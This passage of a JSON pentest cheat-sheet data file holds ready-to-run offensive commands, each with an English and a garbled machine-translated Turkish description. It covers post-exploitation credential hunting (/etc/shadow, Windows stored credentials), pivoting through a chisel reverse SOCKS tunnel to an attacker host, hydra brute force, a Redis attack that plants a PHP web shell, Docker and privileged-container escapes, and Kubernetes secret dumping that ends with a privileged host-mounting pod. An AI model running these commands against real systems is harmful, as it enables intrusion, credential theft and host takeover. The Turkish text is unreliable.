            "tags": [
              "essential"
            ],
            "desc": "Check kernel version and OS for kernel exploits",
            "desc_tr": "Kontrol et: kernel versiand OS for kernel exploits üzerinde"
          },
          {
            "title": "Post-Exploit Step 8: Network Info",
            "cmds": [
              "ip a",
              "ip route",
              "ss -tulpn",
              "cat /etc/hosts",
              "arp -a"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Enumerate network config for pivoting opportunities",
            "desc_tr": "Listele: network config for pivoting opportunities"
          },
          {
            "title": "Post-Exploit Step 9: Sensitive Files",
            "cmds": [
              "cat /etc/passwd",
              "cat /etc/shadow 2>/dev/null",
              "ls -la /home/",
              "find / -name '*.conf' -o -name '*.config' -o -name '*.bak' 2>/dev/null | head -30"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Search for sensitive files, configs, and backups",
            "desc_tr": "Ara: for hassas dosyalar, configs, and backups"
          },
          {
            "title": "Windows Post-Exploit: User Info",
            "cmds": [
              "whoami /all",
              "net user",
              "net localgroup administrators",
              "systeminfo"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Windows equivalent of basic post-exploitation enumeration",
            "desc_tr": "Windows equivalent of basic post-istismar listeleme"
          },
          {
            "title": "Windows Post-Exploit: Stored Creds",
            "cmds": [
              "cmdkey /list",
              "dir C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Credentials\\",
              "reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Search for stored credentials and passwords in Windows",
            "desc_tr": "Ara: for stored kimlik bilgileri and passwords Windows içinde"
          }
        ],
        "name_tr": "Phase 3 — Post-Exploitation Checklist"
      },
      {
        "name": "Phase 4 — Pivoting Workflow",
        "commands": [
          {
            "title": "Pivot Step 1: Discover Interfaces",
            "cmds": [
              "ip a",
              "ip route",
              "arp -a",
              "cat /etc/resolv.conf"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Identify dual-homed interfaces and internal networks",
            "desc_tr": "Tespit et: dual-homed interfaces and internal networks"
          },
          {
            "title": "Pivot Step 2: Internal Host Discovery",
            "cmd": "for i in $(seq 1 254); do (ping -c 1 -W 1 <INTERNAL_SUBNET>.$i | grep 'from' &); done; wait",
            "tags": [
              "essential"
            ],
            "desc": "Quick ping sweep of internal subnet from pivot host",
            "desc_tr": "Hızlı ping sweep of internal subnet pivot host üzerinden"
          },
          {
            "title": "Pivot Step 3: Upload Tunnel Tool",
            "cmd": "# Upload chisel/ligolo/socat to the pivot host via existing shell",
            "tags": [
              "essential"
            ],
            "desc": "Transfer tunneling tool to the compromised host",
            "desc_tr": "Transfer tunneling tool the compromised host'e"
          },
          {
            "title": "Pivot Step 4: Create SOCKS Proxy",
            "cmds": [
              "# On attacker: chisel server --reverse -p 8080",
              "# On pivot: ./chisel client <ATTACKER_IP>:8080 R:socks"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Establish SOCKS proxy through the pivot for proxychains",
            "desc_tr": "Establish SOCKS vekil sunucu (proxy) the pivot for proxychains üzerinden"
          },
          {
            "title": "Pivot Step 5: Configure Proxychains",
            "cmd": "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf",
            "tags": [
              "essential"
            ],
            "desc": "Add SOCKS proxy to proxychains configuration",
            "desc_tr": "Ekle: SOCKS vekil sunucu (proxy) proxychains configuration'e"
          },
          {
            "title": "Pivot Step 6: Scan Through Proxy",
            "cmd": "proxychains4 nmap -sT -Pn -p 21,22,80,135,139,443,445,3389,5985 <INTERNAL_TARGET> 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc": "Port scan internal targets through the pivot",
            "desc_tr": "port taraması internal targets the pivot üzerinden"
          },
          {
            "title": "SSH Dynamic Port Forward",
            "cmd": "ssh -D 1080 -N -f <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Create SOCKS proxy via SSH dynamic port forwarding",
            "desc_tr": "Oluştur: SOCKS vekil sunucu (proxy) SSH dynamic port forwarding üzerinden"
          },
          {
            "title": "SSH Local Port Forward",
            "cmd": "ssh -L <LOCAL_PORT>:<INTERNAL_TARGET>:<REMOTE_PORT> <USER>@<PIVOT_IP> -N",
            "tags": [
              "essential"
            ],
            "desc": "Forward a specific internal service to attacker's localhost",
            "desc_tr": "Yönlendir: a belirli internal service attacker's localhost'e"
          },
          {
            "title": "Double Pivot (SSH Chain)",
            "cmd": "ssh -J <USER1>@<PIVOT1_IP> <USER2>@<PIVOT2_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "SSH through multiple hops using ProxyJump",
            "desc_tr": "SSH multiple hops ProxyJump kullanarak üzerinden"
          }
        ],
        "name_tr": "Phase 4 — Pivoting Workflow"
      },
      {
        "name": "Phase 5 — Proof & Reporting",
        "commands": [
          {
            "title": "Linux Proof Capture",
            "cmds": [
              "echo '=== PROOF ==='",
              "hostname",
              "whoami",
              "id",
              "ip a",
              "cat /root/proof.txt 2>/dev/null || cat /root/flag.txt 2>/dev/null",
              "date"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Capture proof of compromise on Linux targets",
            "desc_tr": "Yakala: proof of compromise Linux targets üzerinde"
          },
          {
            "title": "Windows Proof Capture",
            "cmds": [
              "echo === PROOF ===",
              "hostname",
              "whoami",
              "ipconfig",
              "type C:\\Users\\Administrator\\Desktop\\proof.txt 2>nul",
              "date /t && time /t"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Capture proof of compromise on Windows targets",
            "desc_tr": "Yakala: proof of compromise Windows targets üzerinde"
          },
          {
            "title": "Screenshot with Timestamp (Linux)",
            "cmd": "import -window root screenshot_$(date +%Y%m%d_%H%M%S).png",
            "tags": [
              "tool"
            ],
            "desc": "Take a timestamped desktop screenshot on Linux",
            "desc_tr": "Take a timestamped desktop screenshot Linux üzerinde"
          },
          {
            "title": "Screenshot Current Terminal",
            "cmd": "script -c 'cat /root/proof.txt && id && hostname && ip a' proof_output.txt",
            "tags": [
              "tool"
            ],
            "desc": "Capture terminal output to a file for proof",
            "desc_tr": "Yakala: terminal output a file for proof'e"
          },
          {
            "title": "Archive Engagement Data",
            "cmd": "tar czf engagement_$(date +%Y%m%d).tar.gz scans/ loot/ screenshots/ notes/",
            "tags": [
              "tool"
            ],
            "desc": "Bundle all engagement data for reporting",
            "desc_tr": "Bundle tüm engagement data for reporting"
          }
        ],
        "name_tr": "Phase 5 — Proof & Reporting"
      },
      {
        "name": "Quick Service Checks",
        "commands": [
          {
            "title": "Port 21 — FTP Checks",
            "cmds": [
              "nmap -sV -sC -p 21 <TARGET_IP>",
              "ftp <TARGET_IP>  # try anonymous:anonymous",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "FTP: version scan, anonymous access, brute force",
            "desc_tr": "FTP: versitarama, anonim erişim, kaba kuvvet saldırısı üzerinde"
          },
          {
            "title": "Port 22 — SSH Checks",
            "cmds": [
              "nmap -sV -sC -p 22 <TARGET_IP>",
              "ssh-audit <TARGET_IP>",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SSH: version scan, algorithm audit, brute force",
            "desc_tr": "SSH: versitarama, algorithm audit, kaba kuvvet saldırısı üzerinde"
          },
          {
            "title": "Port 25 — SMTP Checks",
            "cmds": [
              "nmap -sV --script smtp-commands,smtp-enum-users,smtp-vuln* -p 25 <TARGET_IP>",
              "smtp-user-enum -M VRFY -U users.txt -t <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SMTP: commands, user enumeration, vulnerability scan",
            "desc_tr": "SMTP: commands, user listeleme, zafiyet(ler) tarama"
          },
          {
            "title": "Port 53 — DNS Checks",
            "cmds": [
              "nmap -sV --script dns-nsid -p 53 <TARGET_IP>",
              "dig axfr <DOMAIN> @<TARGET_IP>",
              "dig any <DOMAIN> @<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "DNS: zone transfer, full record enumeration",
            "desc_tr": "DNS: zone transferi, full record listeleme"
          },
          {
            "title": "Port 80/443 — HTTP(S) Checks",
            "cmds": [
              "whatweb http://<TARGET_IP>",
              "nikto -h http://<TARGET_IP>",
              "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt"
            ],
            "tags": [
              "essential"
            ],
            "desc": "HTTP: technology identification, vuln scan, directory brute",
            "desc_tr": "HTTP: technology identification, vuln tarama, directory brute"
          },
          {
            "title": "Port 110/995 — POP3 Checks",
            "cmds": [
              "nmap -sV --script pop3-capabilities,pop3-ntlm-info -p 110 <TARGET_IP>",
              "# Connect: telnet <TARGET_IP> 110",
              "# USER <USER> / PASS <PASS>"
            ],
            "tags": [
              "tool"
            ],
            "desc": "POP3: capabilities, authentication testing",
            "desc_tr": "POP3: capabilities, kimlik doğrulama testing"
          },
          {
            "title": "Port 111 — NFS/RPC Checks",
            "cmds": [
              "nmap -sV --script rpcinfo,nfs* -p 111 <TARGET_IP>",
              "showmount -e <TARGET_IP>",
              "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs -o nolock"
            ],
            "tags": [
              "essential"
            ],
            "desc": "NFS/RPC: share enumeration and mounting",
            "desc_tr": "NFS/RPC: share listeleme and mounting"
          },
          {
            "title": "Port 135/139/445 — SMB Checks",
            "cmds": [
              "nmap -sV --script smb-enum-shares,smb-enum-users,smb-vuln* -p 139,445 <TARGET_IP>",
              "smbclient -L //<TARGET_IP> -N",
              "enum4linux-ng -A <TARGET_IP>",
              "crackmapexec smb <TARGET_IP> -u '' -p '' --shares"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SMB: share enum, user enum, vuln scan, null session",
            "desc_tr": "SMB: share enum, user enum, vuln tarama, boş oturum"
          },
          {
            "title": "Port 161 — SNMP Checks",
            "cmds": [
              "snmpwalk -v2c -c public <TARGET_IP>",
              "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <TARGET_IP>",
              "snmp-check <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SNMP: community string brute force and enumeration",
            "desc_tr": "SNMP: community string kaba kuvvet saldırısı and listeleme"
          },
          {
            "title": "Port 389/636 — LDAP Checks",
            "cmds": [
              "nmap -sV --script ldap-rootdse,ldap-search -p 389 <TARGET_IP>",
              "ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "LDAP: anonymous bind, base DN enumeration",
            "desc_tr": "LDAP: anonim erişim, base DN listeleme"
          },
          {
            "title": "Port 1433 — MSSQL Checks",
            "cmds": [
              "nmap -sV --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -p 1433 <TARGET_IP>",
              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
              "crackmapexec mssql <TARGET_IP> -u <USER> -p <PASS> -q 'SELECT @@version'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "MSSQL: info gathering, authentication, query execution",
            "desc_tr": "MSSQL: info gathering, kimlik doğrulama, query execution"
          },
          {
            "title": "Port 1521 — Oracle Checks",
            "cmds": [
              "nmap -sV --script oracle-sid-brute -p 1521 <TARGET_IP>",
              "odat all -s <TARGET_IP> -p 1521"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Oracle: SID brute force and ODAT enumeration",
            "desc_tr": "Oracle: SID kaba kuvvet saldırısı and ODAT listeleme"
          },
          {
            "title": "Port 2049 — NFS Checks",
            "cmds": [
              "showmount -e <TARGET_IP>",
              "nmap -sV --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "NFS: share listing and mount options",
            "desc_tr": "NFS: share listing and mount options"
          },
          {
            "title": "Port 3306 — MySQL Checks",
            "cmds": [
              "nmap -sV --script mysql-info,mysql-enum -p 3306 <TARGET_IP>",
              "mysql -h <TARGET_IP> -u root -p",
              "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "MySQL: info, authentication, brute force",
            "desc_tr": "MySQL: info, kimlik doğrulama, kaba kuvvet saldırısı"
          },
          {
            "title": "Port 3389 — RDP Checks",
            "cmds": [
              "nmap -sV --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <TARGET_IP>",
              "xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "RDP: encryption check, MS12-020 vuln, connection test",
            "desc_tr": "RDP: encrypticheck, MS12-020 vuln, connection test üzerinde"
          },
          {
            "title": "Port 5432 — PostgreSQL Checks",
            "cmds": [
              "nmap -sV --script pgsql-brute -p 5432 <TARGET_IP>",
              "psql -h <TARGET_IP> -U postgres -W"
            ],
            "tags": [
              "tool"
            ],
            "desc": "PostgreSQL: brute force and connection test",
            "desc_tr": "PostgreSQL: kaba kuvvet saldırısı and connectitest üzerinde"
          },
          {
            "title": "Port 5900 — VNC Checks",
            "cmds": [
              "nmap -sV --script vnc-info,vnc-brute -p 5900 <TARGET_IP>",
              "vncviewer <TARGET_IP>::5900"
            ],
            "tags": [
              "tool"
            ],
            "desc": "VNC: version info, brute force, connection",
            "desc_tr": "VNC: versiinfo, kaba kuvvet saldırısı, connection üzerinde"
          },
          {
            "title": "Port 5985 — WinRM Checks",
            "cmds": [
              "nmap -sV -p 5985 <TARGET_IP>",
              "crackmapexec winrm <TARGET_IP> -u <USER> -p <PASS>",
              "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "WinRM: authentication testing and shell access",
            "desc_tr": "WinRM: kimlik doğrulama testing and shell access"
          },
          {
            "title": "Port 6379 — Redis Checks",
            "cmds": [
              "nmap -sV --script redis-info -p 6379 <TARGET_IP>",
              "redis-cli -h <TARGET_IP> INFO",
              "redis-cli -h <TARGET_IP> CONFIG GET *"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Redis: info gathering, unauthenticated access, config dump",
            "desc_tr": "Redis: info gathering, unauthenticated access, config dump"
          },
          {
            "title": "Port 8080/8443 — Web App Checks",
            "cmds": [
              "whatweb http://<TARGET_IP>:8080",
              "gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/dirb/common.txt",
              "# Check for: Tomcat Manager, Jenkins, Weblogic, JBoss"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Web app servers: technology ID, directory enum, default creds",
            "desc_tr": "Web app servers: technology ID, directory enum, default creds"
          },
          {
            "title": "Port 27017 — MongoDB Checks",
            "cmds": [
              "nmap -sV --script mongodb-info,mongodb-databases -p 27017 <TARGET_IP>",
              "mongosh --host <TARGET_IP> --eval 'db.adminCommand({listDatabases:1})'"
            ],
            "tags": [
              "tool"
            ],
            "desc": "MongoDB: info gathering and unauthenticated database listing",
            "desc_tr": "MongoDB: info gathering and unauthenticated database listing"
          }
        ],
        "name_tr": "Quick Service Checks"
      },
      {
        "name": "Service-Specific Attack Playbooks",
        "commands": [
          {
            "title": "Port 21 FTP",
            "desc": "FTP attack checklist",
            "cmds": [
              "ftp <TARGET_IP>  # anonymous",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
              "nmap --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 <TARGET_IP>",
              "wget -r ftp://anonymous:@<TARGET_IP>/"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "FTP attack checklist"
          },
          {
            "title": "Port 22 SSH",
            "desc": "SSH attack checklist",
            "cmds": [
              "nc -nv <TARGET_IP> 22",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
              "ssh -i id_rsa <USER>@<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "SSH attack checklist"
          },
          {
            "title": "Port 25 SMTP",
            "desc": "SMTP attack checklist",
            "cmds": [
              "nmap --script smtp-commands -p 25 <TARGET_IP>",
              "smtp-user-enum -M VRFY -U users.txt -t <TARGET_IP>",
              "nmap --script smtp-open-relay -p 25 <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "SMTP attack checklist"
          },
          {
            "title": "Port 445 SMB",
            "desc": "SMB attack checklist",
            "cmds": [
              "smbclient -L //<TARGET_IP>/ -N",
              "enum4linux -a <TARGET_IP>",
              "nmap --script smb-vuln* -p 445 <TARGET_IP>",
              "crackmapexec smb <TARGET_IP> -u '' -p '' --shares"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "SMB attack checklist"
          },
          {
            "title": "Port 1433 MSSQL",
            "desc": "MSSQL attack checklist",
            "cmds": [
              "nmap --script ms-sql-info -p 1433 <TARGET_IP>",
              "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<TARGET_IP>",
              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP> -windows-auth"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "MSSQL attack checklist"
          },
          {
            "title": "Port 3306 MySQL",
            "desc": "MySQL attack checklist",
            "cmds": [
              "nmap --script mysql-info -p 3306 <TARGET_IP>",
              "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
              "mysql -h <TARGET_IP> -u root -p"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "MySQL attack checklist"
          },
          {
            "title": "Port 5985 WinRM",
            "desc": "WinRM attack checklist",
            "cmds": [
              "crackmapexec winrm <TARGET_IP> -u <USER> -p '<PASS>'",
              "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "WinRM attack checklist"
          },
          {
            "title": "Port 6379 Redis",
            "desc": "Redis attack checklist",
            "cmds": [
              "redis-cli -h <TARGET_IP> INFO",
              "redis-cli -h <TARGET_IP> CONFIG SET dir /var/www/html/",
              "redis-cli -h <TARGET_IP> CONFIG SET dbfilename shell.php",
              "redis-cli -h <TARGET_IP> SET x '<?php system($_GET[\"cmd\"]); ?>'",
              "redis-cli -h <TARGET_IP> SAVE"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Redis attack checklist"
          },
          {
            "title": "Port 27017 MongoDB",
            "desc": "MongoDB attack checklist",
            "cmds": [
              "mongosh <TARGET_IP>:27017",
              "show dbs",
              "nmap --script mongodb-databases -p 27017 <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "MongoDB attack checklist"
          }
        ],
        "name_tr": "Service-Specific Attack Playbooks"
      }
    ],
    "name_tr": "Sızma Testi Metodolojisi ve Playbook",
    "description_tr": "Structured pentest workflow, service checklists, and engagement methodology"
  },
  {
    "id": "container-cloud",
    "name": "Container & Infrastructure Testing",
    "icon": "🐳",
    "description": "Test Docker, Kubernetes, and CI/CD pipeline security",
    "subcategories": [
      {
        "name": "Docker Enumeration & Escape",
        "commands": [
          {
            "title": "List Running Containers",
            "cmd": "docker ps",
            "tags": [
              "essential"
            ],
            "desc": "List all running Docker containers",
            "desc_tr": "Listele: tüm running Docker containers"
          },
          {
            "title": "List All Containers",
            "cmd": "docker ps -a",
            "tags": [
              "essential"
            ],
            "desc": "List all containers including stopped ones",
            "desc_tr": "Listele: tüm containers including stopped ones"
          },
          {
            "title": "List Docker Images",
            "cmd": "docker images",
            "tags": [
              "essential"
            ],
            "desc": "List all locally available Docker images",
            "desc_tr": "Listele: tüm locally available Docker images"
          },
          {
            "title": "Inspect Container Config",
            "cmd": "docker inspect <CONTAINER_ID>",
            "tags": [
              "essential"
            ],
            "desc": "View detailed configuration of a container including mounts and env vars",
            "desc_tr": "View detailed configuratiof a container including mounts and env vars üzerinde"
          },
          {
            "title": "Execute Command in Container",
            "cmd": "docker exec -it <CONTAINER_ID> /bin/bash",
            "tags": [
              "essential"
            ],
            "desc": "Get an interactive shell inside a running container",
            "desc_tr": "Al: an interactive shell inside a running container"
          },
          {
            "title": "Check if Inside Container",
            "cmds": [
              "cat /proc/1/cgroup 2>/dev/null | grep -i docker",
              "ls -la /.dockerenv",
              "cat /proc/self/mountinfo | grep -i docker"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Determine if the current shell is inside a Docker container",
            "desc_tr": "Determine if the mevcut shell is inside a Docker container"
          },
          {
            "title": "Docker Socket Exploitation",
            "cmds": [
              "# If /var/run/docker.sock is mounted:",
              "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
              "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Exploit mounted Docker socket to escape container",
            "desc_tr": "İstismar et: r mounted Docker socket escape container'e"
          },
          {
            "title": "Privileged Container Escape",
            "cmds": [
              "mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape",
              "echo 1 > /tmp/escape/notify_on_release",
              "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
              "echo \"$host_path/exploit.sh\" > /tmp/escape/release_agent",
              "echo '#!/bin/sh' > /exploit.sh && echo '<COMMAND>' >> /exploit.sh && chmod +x /exploit.sh",
              "sh -c 'echo 0 > /tmp/escape/cgroup.procs'"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Escape a --privileged container via cgroups release_agent",
            "desc_tr": "Escape a --privileged container cgroups release_agent üzerinden"
          },
          {
            "title": "Mount Host Filesystem",
            "cmd": "docker run -v /:/host -it <IMAGE> chroot /host",
            "tags": [
              "essential"
            ],
            "desc": "Mount the host root filesystem into a new container",
            "desc_tr": "Bağla: the host root filesystem ina new container'e"
          },
          {
            "title": "nsenter Host Escape",
            "cmd": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
            "tags": [
              "advanced"
            ],
            "desc": "Enter the host namespaces from a privileged container",
            "desc_tr": "Enter the host namespaces a privileged container üzerinden"
          },
          {
            "title": "Check Container Capabilities",
            "cmd": "capsh --print",
            "tags": [
              "essential"
            ],
            "desc": "List current container capabilities for escape assessment",
            "desc_tr": "Listele: mevcut container capabilities for escape assessment"
          },
          {
            "title": "Docker API Unauthenticated",
            "cmd": "curl -s http://<TARGET_IP>:2375/containers/json | jq .",
            "tags": [
              "essential"
            ],
            "desc": "Check for exposed Docker API without authentication",
            "desc_tr": "Kontrol et: for açık Docker API kimlik doğrulama olmadan"
          },
          {
            "title": "Docker Secrets in Environment",
            "cmd": "docker inspect <CONTAINER_ID> --format='{{range .Config.Env}}{{println .}}{{end}}'",
            "tags": [
              "essential"
            ],
            "desc": "Extract environment variables that may contain secrets",
            "desc_tr": "Çıkart: ortam değişkenleri that may contasecrets içinde"
          },
          {
            "title": "Escape via SYS_ADMIN Cap",
            "cmds": [
              "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp",
              "# If mount succeeds, SYS_ADMIN capability is available for escape"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Test and exploit SYS_ADMIN capability for container escape",
            "desc_tr": "Test et: and istismar SYS_ADMcapability for container escape içinde"
          },
          {
            "title": "Deepce Container Escape Scanner",
            "cmd": "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh && chmod +x deepce.sh && ./deepce.sh",
            "tags": [
              "tool"
            ],
            "desc": "Automated Docker container escape detection tool",
            "desc_tr": "Otomatik Docker container escape detectitool üzerinde"
          },
          {
            "title": "Docker API Exploit",
            "desc": "Exploit exposed Docker API",
            "cmds": [
              "curl http://<TARGET_IP>:2375/containers/json",
              "curl http://<TARGET_IP>:2375/images/json"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "İstismar et: r açık Docker API"
          },
          {
            "title": "Docker Registry Enum",
            "desc": "Enumerate registry",
            "cmds": [
              "curl http://<TARGET_IP>:5000/v2/_catalog",
              "curl http://<TARGET_IP>:5000/v2/<REPO>/tags/list"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: registry"
          },
          {
            "title": "nsenter Escape",
            "desc": "Break to host namespace",
            "cmd": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Break host namespace'e"
          }
        ],
        "name_tr": "Docker Enumeration & Escape"
      },
      {
        "name": "Kubernetes Reconnaissance",
        "commands": [
          {
            "title": "Get All Pods",
            "cmd": "kubectl get pods --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "List all pods across all namespaces",
            "desc_tr": "Listele: tüm pods tüm namespaces genelinde"
          },
          {
            "title": "Get All Nodes",
            "cmd": "kubectl get nodes -o wide",
            "tags": [
              "essential"
            ],
            "desc": "List all cluster nodes with detailed info",
            "desc_tr": "Listele: tüm cluster nodes detailed info ile"
          },
          {
            "title": "Get Secrets",
            "cmd": "kubectl get secrets --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "List all secrets in the cluster",
            "desc_tr": "Listele: tüm secrets the cluster içinde"
          },
          {
            "title": "Decode Secret",
            "cmd": "kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key): \\(.value | @base64d)\"'",
            "tags": [
              "essential"
            ],
            "desc": "Decode and view a Kubernetes secret's values",
            "desc_tr": "Çöz: zme and view a Kubernetes secret's values"
          },
          {
            "title": "Get ConfigMaps",
            "cmd": "kubectl get configmaps --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "List all ConfigMaps that may contain sensitive configuration",
            "desc_tr": "Listele: tüm ConfigMaps that may contasensitive configuration içinde"
          },
          {
            "title": "View ConfigMap Data",
            "cmd": "kubectl get configmap <NAME> -n <NAMESPACE> -o yaml",
            "tags": [
              "tool"
            ],
            "desc": "View ConfigMap contents including sensitive data",
            "desc_tr": "View ConfigMap contents including sensitive data"
          },
          {
            "title": "Check Permissions",
            "cmd": "kubectl auth can-i --list",
            "tags": [
              "essential"
            ],
            "desc": "List all permissions for the current service account",
            "desc_tr": "Listele: tüm permissions for the mevcut service account"
          },
          {
            "title": "Check Cluster Admin",
            "cmd": "kubectl auth can-i '*' '*' --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "Check if current identity has cluster-admin privileges",
            "desc_tr": "Kontrol et: if mevcut identity has cluster-admprivileges içinde"
          },
          {
            "title": "Exec into Pod",
            "cmd": "kubectl exec -it <POD_NAME> -n <NAMESPACE> -- /bin/bash",
            "tags": [
              "essential"
            ],
            "desc": "Get an interactive shell in a running pod",
            "desc_tr": "Al: an interactive shell a running pod içinde"
          },
          {
            "title": "Copy File from Pod",
            "cmd": "kubectl cp <NAMESPACE>/<POD_NAME>:/path/to/file ./local_file",
            "tags": [
              "tool"
            ],
            "desc": "Copy a file from a pod to the local machine",
            "desc_tr": "Kopyala: a file a pod the yerel machine üzerinden'e"
          },
          {
            "title": "Get Service Accounts",
            "cmd": "kubectl get serviceaccounts --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List all service accounts in the cluster",
            "desc_tr": "Listele: tüm service accounts the cluster içinde"
          },
          {
            "title": "Get Cluster Role Bindings",
            "cmd": "kubectl get clusterrolebindings -o wide",
            "tags": [
              "tool"
            ],
            "desc": "List cluster role bindings to find privileged accounts",
            "desc_tr": "Listele: cluster role bindings find privileged accounts'e"
          },
          {
            "title": "Read Service Account Token",
            "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "tags": [
              "essential"
            ],
            "desc": "Read the mounted service account token from within a pod",
            "desc_tr": "Oku: the mounted service account token witha pod üzerinden içinde"
          },
          {
            "title": "Kubernetes API from Pod",
            "cmd": "curl -sk https://kubernetes.default.svc/api/v1/namespaces/default/secrets -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"",
            "tags": [
              "essential"
            ],
            "desc": "Query Kubernetes API using the mounted service account token",
            "desc_tr": "Sorgula: Kubernetes API the mounted service account token kullanarak"
          },
          {
            "title": "Get Pod Security Policies",
            "cmd": "kubectl get psp",
            "tags": [
              "tool"
            ],
            "desc": "List Pod Security Policies to find misconfigurations",
            "desc_tr": "Listele: Pod Security Policies find misconfigurations'e"
          },
          {
            "title": "Etcd Read Secrets",
            "cmd": "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get / --prefix --keys-only",
            "tags": [
              "advanced"
            ],
            "desc": "Enumerate etcd keys if etcd is accessible",
            "desc_tr": "Listele: etcd keys if etcd is accessible"
          },
          {
            "title": "Etcd Dump Kubernetes Secrets",
            "cmd": "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get /registry/secrets --prefix --print-value-only",
            "tags": [
              "advanced"
            ],
            "desc": "Dump all Kubernetes secrets directly from etcd",
            "desc_tr": "Dökümle: tüm Kubernetes secrets directly etcd üzerinden"
          },
          {
            "title": "Create Privileged Pod",
            "cmd": "kubectl run pwned --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"pwned\",\"image\":\"alpine\",\"command\":[\"/bin/sh\"],\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}'",
            "tags": [
              "advanced"
            ],
            "desc": "Create a privileged pod mounting the host filesystem",
            "desc_tr": "Oluştur: a privileged pod mounting the host filesystem"
          },
          {
            "title": "Get Ingress Rules",
            "cmd": "kubectl get ingress --all-namespaces",
            "tags": [
